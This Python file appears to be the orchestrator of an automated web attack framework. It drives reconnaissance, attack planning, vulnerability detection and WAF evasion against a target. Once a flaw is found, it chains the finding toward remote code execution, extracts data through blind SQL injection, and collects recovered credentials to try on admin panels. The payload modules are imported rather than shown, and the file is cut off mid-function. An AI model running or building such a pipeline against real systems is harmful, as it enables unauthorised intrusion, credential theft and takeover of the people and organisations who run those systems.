import concurrent.futures
import json
import threading
import time
from typing import Dict, List, Optional

import requests

from tools.log_utils import get_logger

logger = get_logger("orchestrator")

from tools import auth_bypass, crawler, jwt_exploiter, param_miner, sqli_weaponizer, waf_bypass
from tools.adaptive_fuzzer import AdaptiveFuzzer
from tools.adaptive_payload import suggest_additional_tests
from tools.attack_graph import build_attack_graph
from tools.attack_surface import build_attack_plan, pivot_on_intermediate_result
from tools.binary_search import binary_search_sqli_blind, sqli_union_probe
from tools.context_memory import get_memory
from tools.cross_validator import run_cross_validation
from tools.dual_session import DualSessionManager
from tools.oob_server import OOBServer
from tools.playwright_engine import PlaywrightEngine
from tools.reasoning_engine import ReasoningEngine
from tools.recon import (
    check_git_leak,
    fingerprint_tech,
    fuzz_directories,
    scan_ports,
)
from tools.response_profiler import ResponseProfiler
from tools.robust_verifier import verify_finding as robust_verify
from tools.second_order_verifier import SecondOrderVerifier
from tools.semantic_analyzer import analyze_single_response, compare_responses
from tools.spa_crawler import crawl_spa
from tools.ssrf_chain import chain_ssrf as ssrf_chain_attack
from tools.tool_registry import get, get_detector_config
from tools.type_confusion import TypeConfusionDetector
from tools.verification_oracle import VerificationOracle
from tools.version_fingerprint import fingerprint_target
from tools.vuln_context import ContextMemory as VulnContextMemory

SKIP_PARAMS = {
    "submit", "button", "reset", "image", "file", "action",
    "_method", "_token", "utf8", "commit", "form_id", "form_build_id",
    "form_token", "authenticity_token",
}
SIGNATURE_PLACEHOLDER = "__placeholder__"

_detector_config = get_detector_config()
ALL_DETECTOR_NAMES = list(_detector_config["all"].keys())
DETECTOR_RISK_ORDER = _detector_config["risk_order"]
HIGH_VALUE_DETECTORS = set(_detector_config["high_value"])
LOW_VALUE_DETECTORS = set(_detector_config["low_value"])


def _run_detector_by_name(vtype: str, url: str, param: str,
                           sess, timeout: float, waf_name: str = "",
                           oob_opts: dict = None) -> Dict:
    fn = get(vtype)
    if not fn:
        fn = get(vtype.replace("_", "-"))
    if not fn:
        return {"vulnerable": False, "error": f"no detector: {vtype}"}
    try:
        from inspect import signature
        sig = signature(fn)
        kwargs = {}
        if "waf_name" in sig.parameters:
            kwargs["waf_name"] = waf_name
        if "oob_url" in sig.parameters or "oob_server" in sig.parameters:
            kwargs["oob_url"] = (oob_opts or {}).get("oob_url")
            kwargs["oob_domain"] = (oob_opts or {}).get("oob_domain")
        if "sess" in sig.parameters:
            result = fn(url=url, param=param, sess=sess, timeout=timeout, **kwargs)
        else:
            result = fn(url, param, sess, timeout, **kwargs)
        return result if isinstance(result, dict) else {"vulnerable": False, "raw": str(result)}
    except Exception as e:
        logger.debug("run_detector %s: %s", vtype, e)
        return {"vulnerable": False, "error": str(e)}


class Orchestrator:
    def __init__(self, target: str,
                 sess: Optional['requests.Session'] = None, timeout: float = 10.0,
                 threads: int = 20, max_pages: int = 50, max_depth: int = 3,
                 high_priv_sess: Optional['requests.Session'] = None,
                 fast_recon: bool = True, time_budget: Optional[float] = None,
                 high_value: bool = False, turbo: bool = False,
                 skip_verify: bool = False):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.sess = sess
        self.high_priv_sess = high_priv_sess
        self.threads = threads if not turbo else min(threads * 3, 60)
        self.max_pages = max_pages if not turbo else min(max_pages * 2, 100)
        self.max_depth = max_depth if not turbo else min(max_depth + 1, 5)
        self.fast_recon = fast_recon
        self.turbo = turbo
        self.time_budget = time_budget or (180.0 if turbo else (300.0 if high_value else 600.0))
        self.high_value = high_value
        self.skip_verify = skip_verify
        self._start_time = time.time()
        self.state = {
            "phases": {},
            "vulnerabilities": [],
            "exploits": [],
            "summary": {},
        }
        self.profiler = ResponseProfiler()
        self.oracle = VerificationOracle(self.profiler)
        self.dual_session = DualSessionManager(sess, high_priv_sess)
        self.oob_server = OOBServer.get_instance()
        self.attack_plan = None
        self.all_findings = {}
        self.reasoner = ReasoningEngine(target)
        self.last_hypotheses = []
        self._chain_cache = {}
        self.attack_tree = None
        self.attack_graph = None
        self._backtrack_findings = []
        self._lock = threading.Lock()
        self._fast_mode = False
        self._detectors_disabled = set()

        # New enhanced systems
        self.context_memory = get_memory()
        self.verifier = SecondOrderVerifier(sess, timeout)
        self.vuln_ctx = VulnContextMemory()
        from tools.evasion_engine import EvasionEngine
        self.evasion = EvasionEngine()
        self._storage = None
        self._storage_name = "default"

    def init_storage(self, resume: bool = False, name: str = "default"):
        from tools.storage import SessionStore
        self._storage_name = name
        self._storage = SessionStore(name)
        self.context_memory.set_storage(self._storage)
        self.vuln_ctx.set_storage(self._storage)
        if resume:
            self._resume_state()

    def _resume_state(self):
        ctx = self._storage.load_all_context()
        if ctx:
            self.context_memory.restore(ctx)
            logger.info("Resumed %d context entries from session %s", len(ctx), self._storage_name)
        vctx = self._storage.load_vuln_context()
        if vctx:
            self.vuln_ctx.restore(vctx)
            logger.info("Resumed vuln_context (%d fields) from session %s", len(vctx), self._storage_name)
        phases = self._storage.load_all_phases()
        if phases:
            for ph, st in phases.items():
                if isinstance(st, dict):
                    self.state["phases"][ph] = st
                    logger.info("Resumed phase '%s' state", ph)
        findings = self._storage.load_findings()
        if findings:
            for f in findings:
                key = "%s|%s|%s" % (f.get("vuln_type", ""), f.get("url", ""), f.get("param", ""))
                self.all_findings[key] = {
                    "type": f.get("vuln_type", ""),
                    "url": f.get("url", ""),
                    "param": f.get("param", ""),
                    "result": f.get("detail", {}),
                    "vulnerable": True,
                    "confidence_score": f.get("confidence", 0.5),
                }
            logger.info("Resumed %d findings from session %s", len(findings), self._storage_name)
        report = self._storage.load_report()
        if report:
            self.state["report"] = report

    def _save_phase(self, phase: str):
        if not self._storage:
            return
        try:
            data = self.state["phases"].get(phase)
            if data:
                self._storage.save_phase(phase, {"_data": data, "_saved_at": time.time()})
        except Exception as e:
            logger.debug("save phase %s: %s", phase, e)

    def _save_findings(self, findings: Dict):
        if not self._storage:
            return
        try:
            for key, f in findings.items():
                if key.startswith("__"):
                    continue
                self._storage.save_finding(
                    finding_id=key,
                    vuln_type=f.get("type", "unknown"),
                    url=f.get("url", ""),
                    param=f.get("param", ""),
                    payload="",
                    severity="high" if f.get("confidence_score", 0) > 0.8 else "medium",
                    confidence=f.get("confidence_score", 0.5),
                    detail=f.get("result", {}),
                )
        except Exception as e:
            logger.debug("save findings: %s", e)

    def phase_recon(self) -> Dict:
        print("[Recon] Phase 1/7: Reconnaissance ...")
        recon = {"target": self.target}

        print("  [Recon] Technology fingerprint ...")
        recon["technologies"] = fingerprint_tech(self.target, self.sess, self.timeout)
        techs = recon["technologies"].get("technologies", [])
        if techs:
            print("    -> %d technologies detected" % len(techs))
            for t in techs[:10]:
                print("      - %s" % t["name"])
        else:
            print("    -> No specific tech detected")

        print("  [Recon] Version fingerprint & CVE matching ...")
        try:
            version_info = fingerprint_target(self.target, self.sess, self.timeout)
            recon["version_info"] = version_info
            critical_versions = version_info.get("critical_versions", [])
            if critical_versions:
                print("    -> %d critical versions with CVE matches:" % len(critical_versions))
                for cv in critical_versions:
                    print("      - %s %s: %s" % (cv["product"], cv["version"], ", ".join(cv["cves"][:3])))
            else:
                print("    -> %d versions detected, no critical CVE matches" % version_info.get("total_versions", 0))
        except Exception as e:
            logger.debug("version fingerprint: %s", e)

        print("  [Recon] Quick port scan (top 100) ...")
        recon["open_ports"] = scan_ports(self.target, fast=self.fast_recon)
        open_count = recon["open_ports"].get("open_count", 0)
        if open_count:
            print("    -> %d open ports" % open_count)
            for p in recon["open_ports"].get("open_ports", [])[:10]:
                print("      - %d/%s (%s)" % (p["port"], p["service"], p["state"]))
        else:
            print("    -> No obvious open ports")

        print("  [Recon] Git leak check ...")
        recon["git_leak"] = check_git_leak(self.target, self.sess, self.timeout, deep=False)
        if recon["git_leak"].get("git_exposed"):
            sf = len(recon["git_leak"].get("sensitive_finds", []))
            print("    [CRITICAL] .git exposed! %d sensitive finds" % sf)
        else:
            print("    -> No git exposure")

        print("  [Recon] Directory fuzzing (common paths) ...")
        recon["directories"] = fuzz_directories(
            self.target, sess=self.sess, timeout=self.timeout,
            follow_redirects=False,
        )
        interesting = recon["directories"].get("interesting", [])
        if interesting:
            print("    -> %d interesting paths" % len(interesting))
            for d in interesting[:8]:
                print("      - %s [%d] (%d bytes)" % (
                    d["path"], d["status"], d["size"]))
        else:
            print("    -> No interesting paths found")

        print("  [Recon] Debug/actuator endpoint probe ...")
        debug_paths = [
            "/actuator", "/actuator/health", "/actuator/env",
            "/.env", "/debug", "/api/debug", "/console",
            "/h2-console", "/api/health", "/api/env",
        ]
        debug_found = []
        for dp in debug_paths:
            try:
                r = self.sess.get(self.target.rstrip("/") + dp, timeout=self.timeout)
                if r.status_code in (200, 401, 403) and len(r.text) > 5:
                    debug_found.append({"path": dp, "status": r.status_code, "size": len(r.text)})
            except Exception:
                pass
        if debug_found:
            print("    -> %d debug/actuator endpoints found" % len(debug_found))
            for d in debug_found:
                print("      - %s [%d] (%d bytes)" % (d["path"], d["status"], d["size"]))
            self.vuln_ctx.update(has_debug_mode=True)
            self.vuln_ctx.update(debug_endpoints=[d["path"] for d in debug_found])
        else:
            print("    -> No debug endpoints detected")

        self.state["phases"]["recon"] = recon
        self._save_phase("recon")
        return recon

    def phase_attack_plan(self) -> Dict:
        print("[Recon] Building attack plan from recon results ...")
        recon = self.state["phases"].get("recon", {})

        flat_techs = recon.get("technologies", {}).get("technologies", [])
        flat_ports = recon.get("open_ports", {}).get("open_ports", [])
        plan_input = {
            "target": self.target,
            "technologies": flat_techs,
            "open_ports": flat_ports,
            "git_leak": recon.get("git_leak", {}),
            "directories": recon.get("directories", {}).get("interesting", []),
        }

        plan = build_attack_plan(plan_input)

        if plan["phases"]:
            print("  -> Attack plan: %d phases, risk score=%d" % (
                len(plan["phases"]), plan["risk_score"]))
            for ph in plan["phases"][:5]:
                risk = ph.get("risk", "?")
                detail = ""
                if "tech" in ph:
                    detail = ph["tech"]
                elif "port" in ph:
                    detail = "port %d/%s" % (ph["port"], ph.get("module", "?"))
                elif "detectors" in ph:
                    detail = ", ".join(ph["detectors"][:5])
                print("    [%s] %s: %s" % (risk, ph.get("phase", "?"), detail))
        else:
            print("  -> No attack plan generated, falling back to generic")

        self.attack_plan = plan
        self.state["phases"]["attack_plan"] = plan
        self._save_phase("attack_plan")
        return plan

    def phase_reason(self) -> List[Dict]:
        print("[Reason] Phase 1b/7: Hypothesis-driven reasoning ...")
        recon = self.state["phases"].get("recon", {})
        plan = self.attack_plan or {}
        crawl_data = self.state["phases"].get("crawl", {})
        existing_vulns = self.state.get("vulnerabilities", [])

        context = {
            "technologies": recon.get("technologies", {}).get("technologies", []),
            "open_ports": recon.get("open_ports", {}).get("open_ports", []),
            "directories": recon.get("directories", {}).get("interesting", []),
            "git_leak": recon.get("git_leak", {}),
            "vulnerabilities": existing_vulns,
            "crawl_endpoints": crawl_data.get("endpoints", {}),
            "attack_plan": plan,
        }

        hypotheses = self.reasoner.analyze(context)
        self.last_hypotheses = self.reasoner.correlate_hypotheses(hypotheses)

        if hypotheses:
            print("  -> %d hypotheses generated (%d after correlation):" % (
                len(hypotheses), len(self.last_hypotheses)))
            for h in self.last_hypotheses[:8]:
                stars = "*" if h.priority == 0 else ""
                cve_tag = ""
                if h.detail.get("cve_ids") or h.detail.get("matched_cves"):
                    ids = h.detail.get("matched_cves", h.detail.get("cve_ids", []))
                    cve_tag = " [%s]" % ", ".join(ids[:2])
                print("    %s [p=%d] %.0f%% %s%s" % (stars, h.priority, h.confidence * 100, h.vuln_type, cve_tag))
                if h.evidence:
                    print("      evidence: %s" % h.evidence[0][:120])
                if h.suggested_chain:
                    print("      chain: %s" % h.suggested_chain)
        else:
            print("  -> No specific hypotheses, falling back to broad scan")

        attack_tree = self.reasoner.build_attack_tree(context)
        self.attack_tree = attack_tree
        paths = attack_tree.best_paths(min_confidence=0.20)
        if paths:
            print("  -> Attack tree: %d nodes, top paths:" % len(attack_tree.nodes))
            for path in paths[:4]:
                print("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
                if path["chain"]:
                    print("      → %s" % path["chain"])

        hypo_dicts = [h.to_dict() for h in self.last_hypotheses]
        self.state["phases"]["reason"] = {
            "hypotheses": hypo_dicts, "count": len(self.last_hypotheses),
            "attack_tree": attack_tree.summary(),
        }

        # Build attack graph (enhanced attack tree with cycle support)
        print("[Reason] Building attack graph ...")
        self.attack_graph = build_attack_graph(context, self.target)
        graph_summary = self.attack_graph.summary()
        print("  -> Attack graph: %d nodes, %d edges, %d goals" % (
            graph_summary["total_nodes"], graph_summary["total_edges"],
            len(graph_summary["goals"])))
        for path in graph_summary.get("best_paths", [])[:3]:
            print("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))

            self.state["phases"]["reason"]["attack_graph"] = graph_summary
        self._save_phase("reason")
        return hypo_dicts

    def phase_crawl(self) -> Dict:
        result = crawler.crawl(self.target, max_depth=self.max_depth,
                                max_pages=self.max_pages, sess=self.sess,
                                timeout=self.timeout)
        self.state["phases"]["crawl"] = result
        self._save_phase("crawl")
        return result

    def phase_mine(self, crawl_result: Dict = None) -> Dict:
        if crawl_result is None:
            crawl_result = self.state["phases"].get("crawl", {})
        endpoints = crawl_result.get("endpoints", {})
        if not endpoints:
            endpoints = {"/": {"url": self.target, "methods": ["GET"], "params": []}}
        result = param_miner.mine(self.target, endpoints, self.sess,
                                    self.timeout, self.threads)
        self.state["phases"]["param_mine"] = result
        self._save_phase("param_mine")
        return result

    def _select_detectors(self) -> List[str]:
        if self.last_hypotheses:
            suggested = self.reasoner.suggest_detectors(self.last_hypotheses)
            if suggested:
                for d in list(ALL_DETECTOR_NAMES):
                    if d not in suggested:
                        suggested.append(d)
                return self._filter_high_value(suggested)

        plan = self.attack_plan
        recommended = []
        if plan and plan.get("recommended_detectors"):
            recommended = plan["recommended_detectors"]
            mapped = []
            for d in recommended:
                if d in ALL_DETECTOR_NAMES:
                    mapped.append(d)
                elif d == "sql_injection":
                    mapped.append("sql_injection")
            recommended = mapped
        if not recommended:
            recommended = list(ALL_DETECTOR_NAMES)

        recommended = self._filter_high_value(recommended)
        recommended.sort(key=lambda d: DETECTOR_RISK_ORDER.get(d, 9))
        return recommended

    def _filter_high_value(self, detectors: list) -> list:
        if not self.high_value:
            return detectors
        filtered = [d for d in detectors if d in HIGH_VALUE_DETECTORS]
        skipped = set(detectors) - set(filtered)
        if skipped:
            print("  [high-value] skipped low-impact detectors: %s" % ", ".join(sorted(skipped)))
        return filtered

    def _build_test_points(self) -> List[Dict]:
        points = []
        crawl_data = self.state["phases"].get("crawl", {})
        mine_data = self.state["phases"].get("param_mine", {})
        seen = set()
        all_params = set(crawl_data.get("parameters", []))

        for path_data in mine_data.values():
            if isinstance(path_data, dict):
                for p in path_data.get("all_params", []):
                    all_params.add(p)

        for path, info in crawl_data.get("endpoints", {}).items():
            url = info.get("url", "%s%s" % (self.target, path))
            for p in set(info.get("params", []) + list(all_params)[:5]):
                if p.lower() in SKIP_PARAMS:
                    continue
                key = "%s|%s|GET" % (url, p)
                if key not in seen:
                    seen.add(key)
                    points.append({"url": url, "param": p, "method": "GET"})

        for path, pd in mine_data.items():
            if not isinstance(pd, dict):
                continue
            url = "%s%s" % (self.target, path)
            mined = set()
            for p in pd.get("get_params", []):
                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
                    mined.add(p["param"])
            for p in pd.get("post_params", []):
                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
                    mined.add(p["param"])
            for p in mined:
                if p.lower() in SKIP_PARAMS:
                    continue
                key = "%s|%s|GET" % (url, p)
                if key not in seen:
                    seen.add(key)
                    points.append({"url": url, "param": p, "method": "GET"})

        dirs = self.state.get("phases", {}).get("recon", {}).get("directories", {}).get("interesting", [])
        for d in dirs[:20]:
            full_url = self.target.rstrip("/") + d["path"]
            key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
            if key not in seen:
                seen.add(key)
                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_recon": True})

        js_apis = crawl_data.get("js_api_endpoints", [])
        for api_path in js_apis:
            full_url = api_path if api_path.startswith("http") else "%s%s" % (self.target, api_path)
            key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
            if key not in seen:
                seen.add(key)
                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_js": True})
            for param_guess in ["id", "page", "q", "token", "key", "limit", "offset", "filter", "search"]:
                pk = "%s|%s|GET" % (full_url, param_guess)
                if pk not in seen:
                    seen.add(pk)
                    points.append({"url": full_url, "param": param_guess, "method": "GET", "from_js": True})

        plan = self.attack_plan
        if plan:
            for ph in plan.get("phases", []):
                if ph.get("phase") == "tech_specific":
                    for mod in ph.get("priority_modules", []):
                        full_url = self.target.rstrip("/") + mod
                        key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
                        if key not in seen:
                            seen.add(key)
                            points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_plan": True})

        techs = [t.get("id", "") for t in self.state.get("phases", {}).get("recon", {}).get("technologies", {}).get("technologies", [])]
        if techs:
            for p in points:
                score = self.reasoner.score_endpoint(p["param"], techs)
                p["_score"] = score
            points.sort(key=lambda p: -p.get("_score", 0))

        if techs and points:
            fuzzer = AdaptiveFuzzer(tech_stack=techs)
            enriched = []
            seen_url_params = set()
            for p in points:
                key = (p["url"], p["param"])
                if key in seen_url_params:
                    continue
                seen_url_params.add(key)
                groups = fuzzer.all_groups(
                    param_name=p["param"],
                    url_path=p["url"].replace(self.target, ""),
                )
                p["_payload_groups"] = [
                    {"vuln_type": g.vuln_type, "confidence": g.confidence, "count": len(g.payloads)}
                    for g in groups[:5]
                ]
                enriched.append(p)
            points = enriched

        limit = 500 if self.turbo else 300
        return points[:limit]

    def _budget_remaining(self) -> float:
        return self.time_budget - (time.time() - self._start_time)

    def _budget_ok(self, needed: float = 5.0) -> bool:
        return self._budget_remaining() > needed

    def _filter_by_budget(self, points: List[Dict]) -> List[Dict]:
        remaining = self._budget_remaining()
        if remaining > self.time_budget * 0.6:
            return points
        if remaining < 15:
            return points[:30]
        ratio = remaining / self.time_budget
        cutoff = max(int(len(points) * ratio), 20)
        return points[:cutoff]

    def _maybe_backtrack_chain(self, finding: Dict) -> Optional[Dict]:
        vtype = finding.get("type", "").lower()
        url = finding.get("url", "")
        param = finding.get("param", "")
        chain_key = "%s|%s|%s" % (vtype, url, param)
        if chain_key in self._chain_cache:
            return None

        from tools.chain_engine import ChainEngine
        chain = ChainEngine(self.sess, self.timeout)

        vtype_to_chain = {
            "ssrf": ("ssrf_to_rce", chain.chain_ssrf_to_rce),
            "lfi": ("lfi_to_rce", chain.chain_lfi_to_rce),
            "sqli": ("sqli_to_rce", chain.chain_sqli_to_rce),
            "xss": ("xss_to_hijack", chain.chain_xss_to_hijack),
            "deser": ("deser_to_rce", chain.chain_deser_to_rce),
        }

        if vtype in vtype_to_chain and self._budget_ok(10):
            cname, cfn = vtype_to_chain[vtype]
            print("\n    [Backtrack] %s on %s?%s — running %s NOW" % (vtype.upper(), url, param, cname))
            try:
                r = cfn(url, param)
                self._chain_cache[chain_key] = r
                if r.get("success"):
                    print("      [CRITICAL] Chain %s confirmed mid-scan!" % cname)
                    if r.get("credentials_extracted"):
                        print("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
                    if r.get("rce_available"):
                        print("      [RCE] %s" % r.get("rce_method", "?"))
                return r
            except Exception as e:
                logger.debug("backtrack chain %s: %s", cname, e)

        return None

    def _cross_verify(self, vtype: str, url: str, param: str,
                       waf_name: str, oob: dict, first_result: dict) -> dict:
        """Multi-angle verification: re-run same detector with different payloads."""
        cross_findings = []

        fn_cross = _run_detector_by_name(vtype, url, param, self.sess, self.timeout, waf_name, oob)
        if fn_cross.get("error"):
            first_result["cross_verified"] = []
            first_result["cross_count"] = 0
            first_result["confirmed"] = first_result.get("vulnerable", False)
            return first_result

        try:
            r2 = _run_detector_by_name(vtype, url, param, self.sess, self.timeout, waf_name, oob)
            if isinstance(r2, dict) and r2.get("vulnerable"):
                cv = self.oracle.verify(vtype, r2, url, param, self.sess, self.timeout)
                if cv.get("verified") is not False:
                    cross_findings.append(vtype)
        except Exception:
            pass

        first_result["cross_verified"] = cross_findings
        first_result["cross_count"] = len(cross_findings)
        first_result["confirmed"] = len(cross_findings) >= 1 or first_result.get("verified") is not False
        return first_result

    def _backtrack_loop_closure(self, chain_result: dict, finding: dict) -> None:
        """Feed chain output back into new attack surface.

        If a chain extracts credentials, try them on discovered services.
        If it gets RCE, mark completion.
        """
        if not chain_result or not chain_result.get("success"):
            return

        creds = chain_result.get("credentials_extracted", [])
        rce = chain_result.get("rce_available")
        vtype = finding.get("type", "").lower()

        if creds:
            print("    [Loop] %d credentials recovered — probing stored services" % len(creds))
            for cred in creds[:5]:
                self.state.setdefault("recovered_credentials", []).append(cred)

        if rce:
            print("    [Loop] RCE achieved via %s — marking attack surface" % vtype)
            self.state.setdefault("exploits", []).append({
                "source": vtype,
                "type": "rce",
                "url": finding.get("url", ""),
                "credential_count": len(creds),
                "chain_result": chain_result.get("rce_method", "unknown"),
            })

        if vtype == "sqli" and creds:
            for c in creds:
                if ":" in c or "@" in c:
                    print("    [Loop] Credential format %s — will try on discovered admin panels" %
                          c.split(":")[0] if ":" in c else c.split("@")[0])
                    self.state.setdefault("admin_creds", []).append(c)

    def _run_detector(self, vtype: str, url: str, param: str,
                      waf_name: Optional[str], oob: dict,
                      effective_timeout: float) -> Optional[Dict]:
        if vtype not in ALL_DETECTOR_NAMES:
            return None
        try:
            r = _run_detector_by_name(vtype, url, param, self.sess, effective_timeout, waf_name, oob)
            if isinstance(r, dict):
                r["_vtype"] = vtype
                return r
        except Exception as e:
            logger.debug("detect %s on %s?%s: %s", vtype, url, param, e)
        return None

    def _test_single_point(self, point: Dict, active_detectors: List[str],
                           waf_name: Optional[str] = None,
                           oob_url: Optional[str] = None,
                           oob_domain: Optional[str] = None) -> List[Dict]:
        if not self._budget_ok(2):
            return []

        url = point["url"]
        param = point["param"]
        oob = {"oob_url": oob_url, "oob_domain": oob_domain}
        results = []
        found_critical = False

        effective_timeout = max(self.timeout * 0.7, 3.0) if self.turbo else self.timeout

        eligible = []
        for vtype in active_detectors:
            if vtype in self._detectors_disabled:
                continue
            if found_critical and vtype in LOW_VALUE_DETECTORS:
                continue
            time_sensitive = {"sqli", "cmdi", "nosqli", "ssti"}
            timeout_needed = 8 if self.turbo else 10
            if vtype in time_sensitive and not self._budget_ok(timeout_needed):
                continue
            eligible.append(vtype)

        if not eligible:
            return []

        if self.turbo and len(eligible) > 1:
            det_workers = min(len(eligible), 4)
            raw_results = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=det_workers) as dex:
                futures = {
                    dex.submit(self._run_detector, vt, url, param, waf_name, oob, effective_timeout): vt
                    for vt in eligible
                }
                for future in concurrent.futures.as_completed(futures):
                    if not self._budget_ok(2):
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        r = future.result(timeout=effective_timeout + 2)
                        if r:
                            raw_results.append(r)
                    except Exception:
                        pass
        else:
            raw_results = []
            for vtype in eligible:
                if not self._budget_ok(2):
                    break
                r = self._run_detector(vtype, url, param, waf_name, oob, effective_timeout)
                if r:
                    raw_results.append(r)

        for r in raw_results:
            vtype = r.pop("_vtype", "")
            if not self._budget_ok(2):
                break

            native_confidence = r.get("confidence_score", 0.0)
            native_votes = r.get("confidence_votes", [])
            native_evidence = r.get("evidence", [])

            vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
            if vuln and not self.skip_verify and self._budget_ok(5):
                r = self._cross_verify(vtype, url, param, waf_name, oob, r)
                vuln = r.get("confirmed", vuln)
            if vuln:
                if vtype in ("sql_injection", "cmdi", "ssrf", "deser"):
                    found_critical = True
                    if self._fast_mode:
                        self._detectors_disabled.update(LOW_VALUE_DETECTORS)

                if self.skip_verify:
                    verified = r
                    verified["verified"] = True
                    oracle_confidence = native_confidence
                else:
                    verified = self.oracle.verify(vtype, r, url, param, self.sess, self.timeout)
                    oracle_confidence = verified.get("confidence_score", 0.0)

                if verified.get("verified") is not False:
                    finding = {
                        "type": vtype,
                        "url": url,
                        "param": param,
                        "result": verified,
                        "vulnerable": True,
                        "detector_confidence": round(native_confidence, 2),
                        "confidence_score": round(max(native_confidence, oracle_confidence), 2),
                        "confidence_votes": verified.get("confidence_votes", []) or native_votes,
                        "evidence": verified.get("evidence", native_evidence),
                        "timestamp": time.time(),
                        "response_text": verified.get("response_text", r.get("response_text", "")),
                    }

                    if not self.skip_verify:
                        from tools.false_positive_filter import FalsePositiveFilter
                        fpf = FalsePositiveFilter(self.profiler)
                        finding = fpf.filter_single(finding)

                    if not finding.get("filtered", False):
                        if not self.skip_verify:
                            rv = robust_verify(vtype, url, param, self.sess, self.timeout, self.oob_server)
                            if rv.get("vulnerable"):
                                finding["robust_verified"] = True
                                finding["confidence_score"] = max(finding.get("confidence_score", 0), rv["confidence"])
                                finding["robust_check"] = rv
                                if rv.get("dbms"):
                                    finding["dbms"] = rv["dbms"]

                        if vtype in ("sqli", "ssrf", "lfi", "cmdi", "deser"):
                            self.vuln_ctx.update(**{vtype: True, vtype + "_verified": True})
                        if vtype == "ssrf":
                            cloud = finding.get("result", {}).get("cloud")
                            if cloud:
                                self.vuln_ctx.update(cloud_provider=cloud)
                        if vtype == "sqli":
                            dbms = finding.get("result", {}).get("dbms")
                            if not self.skip_verify:
                                dbms = dbms or rv.get("dbms")
                            if dbms:
                                self.vuln_ctx.update(dbms=dbms)
                        if vtype == "cmdi":
                            os_type = finding.get("result", {}).get("os_type")
                            if os_type:
                                self.vuln_ctx.update(os_type=os_type)

                        results.append(finding)

                        with self._lock:
                            self._backtrack_findings.append(finding)

                        chain_result = self._maybe_backtrack_chain(finding)
                        if chain_result:
                            finding["_chain_result"] = chain_result
                            self._backtrack_loop_closure(chain_result, finding)

                        if not self.skip_verify:
                            cross = run_cross_validation(vtype, url, param, self.sess, self.timeout)
                            if cross.get("vulnerable"):
                                finding["cross_validated"] = True
                                finding["cross_checks"] = cross.get("cross_checks", {})
                                finding["confidence_score"] = max(finding.get("confidence_score", 0), cross.get("confidence", 0))
                                if cross.get("rce_available"):
                                    finding["rce_available"] = True

                        if vtype == "sqli" and finding.get("vulnerable"):
                            try:
                                union_probe = sqli_union_probe(url, param, self.sess, self.timeout)
                                if union_probe.get("vulnerable"):
                                    finding["sql_columns"] = union_probe.get("columns")
                                    finding["sql_usable_columns"] = union_probe.get("usable_columns")
                                blind_data = binary_search_sqli_blind(url, param, self.sess, self.timeout)
                                if blind_data.get("extracted"):
                                    finding["blind_extracted"] = blind_data["extracted"]
                            except Exception:
                                pass

                        if vtype in ("sqli", "ssrf", "lfi", "cmdi", "ssti"):
                            try:
                                extra_tests = suggest_additional_tests(vtype, self.vuln_ctx)
                                if extra_tests:
                                    finding["suggested_next_steps"] = extra_tests
                            except Exception:
                                pass
                    else:
                        with self._lock:
                            self.state.setdefault("filtered_findings", []).append(finding)
        return results

    def _update_context_memory(self, findings: Dict) -> None:
        """Update context memory with discovered information for cross-module intelligence."""
        recon = self.state["phases"].get("recon", {})

        # Store technology info
        techs = recon.get("technologies", {}).get("technologies", [])
        for tech in techs:
            name = tech.get("name", "").lower()
            if "spring" in name:
                self.context_memory.set("framework", "Spring Boot", "recon", 0.85)
            elif "django" in name:
                self.context_memory.set("framework", "Django", "recon", 0.85)
            elif "flask" in name:
                self.context_memory.set("framework", "Flask", "recon", 0.85)
            elif "laravel" in name:
                self.context_memory.set("framework", "Laravel", "recon", 0.85)
            elif "thinkphp" in name:
                self.context_memory.set("framework", "ThinkPHP", "recon", 0.85)
            elif "express" in name or "node" in name:
                self.context_memory.set("framework", "Express", "recon", 0.80)
            elif "wordpress" in name:
                self.context_memory.set("framework", "WordPress", "recon", 0.85)

        # Store WAF info
        waf_info = self.state.get("waf", {})
        if waf_info.get("name"):
            self.context_memory.set("waf", waf_info["name"], "waf_bypass", 0.80)

        # Store cloud provider info
        cloud_indicators = {
            "aws": ["amazon", "aws", "ec2", "s3"],
            "gcp": ["google", "gcp", "gcloud"],
            "azure": ["azure", "microsoft"],
            "alibaba": ["aliyun", "alibaba"],
        }
        for tech in techs:
            name = tech.get("name", "").lower()
            for provider, indicators in cloud_indicators.items():
                if any(ind in name for ind in indicators):
                    self.context_memory.set("cloud_provider", provider, "recon", 0.75)
                    break

        # Store findings-based intelligence
        for key, finding in findings.items():
            if key.startswith("__"):
                continue
            vtype = finding.get("type", "")
            result = finding.get("result", {})

            if vtype == "sqli" and result.get("dbms"):
                self.context_memory.set("dbms", result["dbms"], "sqli_detector", 0.90)

            if vtype == "ssrf" and result.get("cloud"):
                self.context_memory.set("cloud_provider", result["cloud"], "ssrf_detector", 0.85)

            if vtype == "lfi" and result.get("os_type"):
                self.context_memory.set("os_type", result["os_type"], "lfi_scanner", 0.75)

            if vtype == "cmdi" and result.get("os_type"):
                self.context_memory.set("os_type", result["os_type"], "cmdi_detector", 0.75)

            if vtype == "auth_bypass" and result.get("credentials"):
                self.context_memory.set("creds", result["credentials"], "auth_bypass", 0.80)

            if vtype == "jwt" and result.get("tokens_found"):
                for token_info in result["tokens_found"][:1]:
                    if token_info.get("token"):
                        self.context_memory.set("session_token", token_info["token"], "jwt_detector", 0.70)

        # Store OS type from port scan
        ports = recon.get("open_ports", {})
        open_ports = [p.get("port", 0) for p in ports.get("open_ports", [])]
        if 3389 in open_ports:
            self.context_memory.set("os_type", "windows", "port_scan", 0.70)
        elif 22 in open_ports:
